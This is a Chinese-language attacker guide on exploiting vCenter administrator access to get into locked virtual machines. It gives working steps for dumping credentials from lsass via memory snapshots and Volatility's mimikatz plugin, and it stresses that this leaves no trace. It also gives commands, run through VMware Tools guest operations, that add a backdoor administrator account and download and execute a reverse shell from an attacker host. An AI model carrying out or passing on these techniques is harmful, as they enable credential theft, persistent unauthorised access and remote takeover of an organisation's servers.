### 拿到 vCenter 管理员权限，但部分虚拟机处于锁屏状态怎么办

**1. 内存转储攻击**

这是最强大且隐蔽的攻击方式，它能让你在不与虚拟机桌面直接交互的情况下，窃取到所有已登录用户的密码

- **原理**：Windows 操作系统在运行时，会将已登录用户的明文密码、NTLM 哈希和 Kerberos 票据等凭据信息，存储在 `lsass.exe` 进程的内存中。作为 vCenter 管理员，你可以获取虚拟机的**内存快照，这个快照文件包含了虚拟机在某一时刻的全部内存数据

- **操作步骤**：

  1. 在 vCenter 界面中，找到锁屏的虚拟机

  2. 右键点击虚拟机，选择 **Snapshot -> Take Snapshot**。在弹出的窗口中，勾选 **"Snapshot the virtual machine's memory"**

  3. 等待快照完成后，找到这个快照文件（通常是 `.vmem` 或 `.vmss` 文件）。这个文件通常位于 ESXi 主机的数据存储（Datastore）上

  4. 将这个文件下载到你的攻击机

  5. 在攻击机上使用**内存取证工具**，例如 **`Volatility`**。执行命令来分析 `.vmem` 文件并提取凭据

     ```bash
     # 识别操作系统类型
     volatility -f <内存快照文件> imageinfo
     # 从lsass进程中提取密码哈希和明文密码
     volatility -f <内存快照文件> --profile=<识别出的操作系统> mimikatz
     ```

- **优点**：这种方法非常隐蔽，几乎不会在虚拟机内留下任何痕迹，也不会触发任何安全告警。即使虚拟机锁屏，你依然可以成功获取登录凭据

**2. 利用 VMware Tools 在虚拟机内执行命令**

如果虚拟机内安装了 VMware Tools，你就可以利用 vCenter 的 **`Guest Operations`** 功能，直接在虚拟机内部执行命令，而无需登录

- **原理**：VMware Tools 是一个运行在虚拟机操作系统中的服务，它与 vCenter 后台进程进行通信。这使得 vCenter 可以远程管理虚拟机，包括文件传输、脚本执行等
- **操作步骤**：
  1. 在 vCenter 界面中，找到锁屏的虚拟机
  2. 右键点击虚拟机，选择 **Guest OS -> Run Program in Guest**
  3. 在弹出的对话框中，你可以输入想要执行的命令
  4. 你可以执行以下命令来建立一个持久化的后门
     - **创建新的管理员用户**： `C:\Windows\System32\cmd.exe /c "net user newuser password /add"` `C:\Windows\System32\cmd.exe /c "net localgroup administrators newuser /add"`
     - **下载并执行反向 Shell**： `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c "iwr http://<攻击机IP>/shell.ps1 -OutFile C:\temp\shell.ps1; Start-Process C:\temp\shell.ps1"`
- **优点**：这种方法简单直接，只要虚拟机处于开机状态且 VMware Tools 运行正常，你就可以绕过锁屏，直接在内部执行命令

**3. 创建新的管理员账户**

如果上述方法都失败了，你还有终极权限——在虚拟机内创建新的管理员账户

- **原理**：利用 VMware Tools 的 `Run Program in Guest` 功能，你可以直接调用操作系统命令来创建新用户并将其添加到管理员组
- **操作步骤**：
  - 执行上面提到的 **`net user`** 和 **`net localgroup`** 命令，创建一个新的管理员账户
  - 等待命令执行成功后，你就可以使用这个新创建的账户，远程桌面连接到虚拟机，或者通过其他方式登录